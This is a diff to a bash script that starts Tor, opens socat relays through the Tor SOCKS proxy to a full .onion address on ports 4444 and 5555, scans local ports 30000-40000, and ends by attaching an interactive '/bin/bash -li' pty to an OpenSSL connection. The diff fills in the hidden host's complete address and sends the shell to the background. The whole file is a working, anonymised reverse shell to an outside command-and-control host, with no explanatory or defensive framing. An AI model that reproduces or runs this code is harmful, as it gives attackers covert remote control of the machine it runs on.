@@ -15,7 +15,7 @@ else
     fi
 fi
 
-status_tor=$(systemctl --type=service --state=running |  grep tor)
+status_tor=$(systemctl --type=service --state=running |  grep tor | grep "loaded active running Anonymizing overlay network for TCP")
 if  [[ -z "$status_tor" ]]; then
         systemctl start tor.service;
         sleep 240
@@ -25,7 +25,7 @@ fi
 
 PORT_PROXY_INITIAL_CONNECTION=$(ss -tulnp | awk '{print $5}' | grep 9999)
 if [[ -z "$PORT_PROXY_INITIAL_CONNECTION" ]]; then
-        socat TCP-LISTEN:9999,reuseaddr SOCKS5-CONNECT:localhost:9050:wznpsql7....l7nsiv3xc4k6id.onion:4444 &
+        socat TCP-LISTEN:9999,reuseaddr SOCKS5-CONNECT:localhost:9050:wznpsql7l4pdp4wetxd45cm5xqef6vhsleirckixnql7nsiv3xc4k6id.onion:4444 &
 fi
 
 
@@ -34,8 +34,10 @@ PORT=$(socat - OPENSSL:localhost:9999,verify=0)
 sleep 2
 
 PORT_PROXY_FOR_SEND_PROXY_PORT=$(ss -tulnp | awk '{print $5}' | grep 8888)
-if [[ -z "$PORT_PROXY_INITIAL_CONNECTION" ]]; then
-        socat TCP-LISTEN:8888,reuseaddr SOCKS5-CONNECT:localhost:9050:wznpsql7....l7nsiv3xc4k6id.onion:5555 &
+
+sleep 4
+if [[ -z "$PORT_PROXY_FOR_SEND_PROXY_PORT" ]]; then
+        socat TCP-LISTEN:8888,reuseaddr SOCKS5-CONNECT:localhost:9050:wznpsql7l4pdp4wetxd45cm5xqef6vhsleirckixnql7nsiv3xc4k6id.onion:5555 &
 fi
 
 for PORT_LISTEN in {30000..40000}; do
@@ -48,5 +50,4 @@ for PORT_LISTEN in {30000..40000}; do
 done
 
 sleep 10
-socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane OPENSSL:localhost:"$PORT_LISTEN",verify=0
-
+socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane OPENSSL:localhost:"$PORT_LISTEN",verify=0 &
